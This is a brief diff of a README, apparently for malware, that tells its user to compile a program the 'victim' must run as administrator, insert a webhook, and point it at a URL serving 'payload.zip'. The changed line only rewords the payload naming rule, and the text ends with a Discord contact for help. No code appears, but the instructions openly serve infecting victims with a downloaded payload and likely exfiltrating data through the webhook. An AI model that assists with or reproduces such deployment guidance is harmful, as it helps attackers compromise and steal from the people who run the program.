@@ -8,7 +8,7 @@ After compiling, the victim needs to run it as administrator.
 Add your webhook at line 16
 
 Add your url at line 31. 
-THE DOWNLOADED PAYLOAD NEEDS TO BE "payload.zip". ex: https://YourWebsite/payload.zip
+the source needs to contain "payload.zip". ex: https://YourWebsite/payload.zip
 
  **If you have more issues add Charon's Ghost#9713 on discord**
 
